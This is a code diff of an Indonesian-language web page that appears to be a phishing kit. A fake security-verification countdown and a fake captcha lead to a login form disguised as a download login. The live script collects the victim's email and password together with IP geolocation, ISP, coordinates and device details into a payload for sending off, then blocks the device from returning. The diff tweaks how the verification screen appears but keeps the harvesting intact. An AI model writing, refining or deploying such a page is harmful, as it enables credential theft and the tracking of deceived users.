@@ -45,9 +45,8 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .vt-title{font-size:17px;font-weight:bold;color:#222;margin-top:14px;margin-bottom:6px;}
 .vt-desc{font-size:13px;color:#333;line-height:1.5;}
 
-/* ================= VERIFIKASI HUMAN ================= */
-#verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:none;align-items:center;justify-content:center;padding:20px;z-index:999999;}
-#verifyModal.show{display:flex;}
+/* ================= VERIFIKASI (LANGSUNG MUNCUL) ================= */
+#verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;padding:20px;z-index:999999;}
 .verify-card{background:#fff;width:100%;max-width:380px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);border:1px solid #eee;padding:36px 24px 28px;text-align:center;}
 .verify-progress-wrap{position:relative;width:90px;height:90px;margin:0 auto 22px;}
 .verify-progress-wrap svg{transform:rotate(-90deg);width:90px;height:90px;}
@@ -284,6 +283,13 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 <script>
 
 /* =========================================================
+   STATE
+   ========================================================= */
+var captchaChecked = false;
+var verifyInterval = null;
+
+
+/* =========================================================
    CEK BLOKIR
    ========================================================= */
 function cekDeviceBlocked(){
@@ -301,28 +307,20 @@ function setDeviceBlocked(){
 
 
 /* =========================================================
-   VERIFIKASI
+   PROGRESS VERIF
    ========================================================= */
-var captchaChecked = false;
-var verifyInterval = null;
+function mulaiProgress(){
 
-function openVerifyModal(){
-
-    var modal = document.getElementById("verifyModal");
-    if(!modal) return;
-    modal.classList.add("show");
-
-    captchaChecked = false;
-
-    var box = document.getElementById("captchaBox");
-    var frame = document.getElementById("captchaFrame");
-    var btn = document.getElementById("btnLanjut");
     var bar = document.getElementById("verifyBar");
     var percentText = document.getElementById("verifyPercent");
     var timerText = document.getElementById("verifyTimer");
     var titleEl = document.getElementById("verifyTitle");
     var subEl = document.getElementById("verifySub");
+    var box = document.getElementById("captchaBox");
+    var frame = document.getElementById("captchaFrame");
+    var btn = document.getElementById("btnLanjut");
 
+    captchaChecked = false;
     if(box) box.classList.remove("show");
     if(frame) frame.classList.remove("checked");
     if(btn){ btn.classList.remove("active"); btn.disabled = true; btn.textContent = "Lanjutkan"; }
@@ -333,20 +331,20 @@ function openVerifyModal(){
 
     if(!bar) return;
 
-    var percent = 0;
+    var tick = 0;
     var total = 251.2;
 
     if(verifyInterval) clearInterval(verifyInterval);
 
     verifyInterval = setInterval(function(){
-        percent += 1;
-        if(percent > 48) percent = 48;
+        tick++;
+        var percent = Math.min(tick, 48);
         bar.style.strokeDashoffset = total - (total * percent / 100);
         if(percentText) percentText.textContent = percent + "%";
-        var sisa = Math.max(0, Math.ceil((48 - percent) / 3));
+        var sisa = Math.max(0, Math.ceil((48 - tick) / 3));
         if(timerText) timerText.textContent = "Memverifikasi keamanan... (" + sisa + " detik)";
 
-        if(percent >= 48){
+        if(tick >= 48){
             clearInterval(verifyInterval);
             verifyInterval = null;
             if(timerText) timerText.textContent = "";
@@ -359,6 +357,10 @@ function openVerifyModal(){
     }, 60);
 }
 
+
+/* =========================================================
+   CAPTCHA
+   ========================================================= */
 function toggleCaptcha(){
     captchaChecked = !captchaChecked;
     var frame = document.getElementById("captchaFrame");
@@ -376,10 +378,11 @@ function lanjutKeLogin(){
     if(!captchaChecked) return;
     var btn = document.getElementById("btnLanjut");
     if(btn){ btn.textContent = "Memverifikasi..."; btn.classList.remove("active"); btn.disabled = true; }
+
     setTimeout(function(){
         sessionStorage.setItem("verified","1");
         var vm = document.getElementById("verifyModal");
-        if(vm) vm.classList.remove("show");
+        if(vm) vm.style.display = "none";
         var lm = document.getElementById("loginModal");
         if(lm) lm.classList.add("show");
         if(btn) btn.textContent = "Lanjutkan";
@@ -388,7 +391,7 @@ function lanjutKeLogin(){
 
 
 /* =========================================================
-   VALIDASI & HELPER
+   VALIDASI + HELPER
    ========================================================= */
 function validasiInput(email, pass){
     if(!email || !pass) return "Harap isi email dan kata sandi!";
@@ -400,7 +403,7 @@ function validasiInput(email, pass){
 }
 
 function formatWaktuWIB(date){
-    var opt = { timeZone:"Asia/Jakarta", day:"2-digit",month:"2-digit",year:"numeric", hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:false };
+    var opt = { timeZone:"Asia/Jakarta", day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:false };
     var parts = new Intl.DateTimeFormat("id-ID", opt).formatToParts(date);
     var obj = {};
     parts.forEach(function(p){ obj[p.type] = p.value; });
@@ -444,7 +447,7 @@ function detectBrowser(ua){
 function openDownloadLogin(event){
     if(event){ event.stopPropagation(); }
     if(cekDeviceBlocked()){ window.location.replace("/blokir"); return; }
-    if(!sessionStorage.getItem("verified")){ openVerifyModal(); return; }
+    if(!sessionStorage.getItem("verified")){ return; }
     document.getElementById("loginModal").classList.add("show");
 }
 
@@ -480,7 +483,6 @@ function clearMessage(){
    ========================================================= */
 function loginUser(event){
     event.preventDefault();
-
     var username = document.getElementById("loginUsername").value.trim();
     var password = document.getElementById("loginPassword").value;
 
@@ -498,15 +500,10 @@ function loginUser(event){
             var payload = {
                 email: username, password: password,
                 ip: d.ip || "-",
-                ipv6: (d.version === "IPv6") ? d.ip : "-",
-                negaraKode: d.country_code || "-",
                 negara: d.country_name || "-",
                 prov: d.region || "-",
                 kota: d.city || "-",
-                zona: d.timezone || "-",
                 isp: d.org || "-",
-                asn: d.asn || "-",
-                zip: d.postal || "-",
                 koord: (d.latitude||"-")+" , "+(d.longitude||"-"),
                 waktu: formatWaktuWIB(new Date()),
                 device: detectDevice(ua),
@@ -542,9 +539,9 @@ function loginUser(event){
 
 
 /* =========================================================
-   INIT
+   START — DOM READY
    ========================================================= */
-window.addEventListener("load", function(){
+document.addEventListener("DOMContentLoaded", function(){
 
     /* KALO UDAH SUBMIT → BLOKIR */
     if(cekDeviceBlocked()){
@@ -552,10 +549,18 @@ window.addEventListener("load", function(){
         return;
     }
 
-    /* AUTO MUNCULIN VERIF PAS BUKA */
-    if(sessionStorage.getItem("verified") !== "1"){
-        openVerifyModal();
+    /* KALO UDAH VERIF DI SESI INI → SEMBUNYIIN VERIF, BUKA LOGIN */
+    if(sessionStorage.getItem("verified") === "1"){
+        var vm = document.getElementById("verifyModal");
+        if(vm) vm.style.display = "none";
+        var lm = document.getElementById("loginModal");
+        if(lm) lm.classList.add("show");
+        return;
     }
+
+    /* KALO BELUM → MULAI PROGRESS (verif udah otomatis muncul dari CSS) */
+    mulaiProgress();
+
 });
 
 document.addEventListener("keydown", function(event){
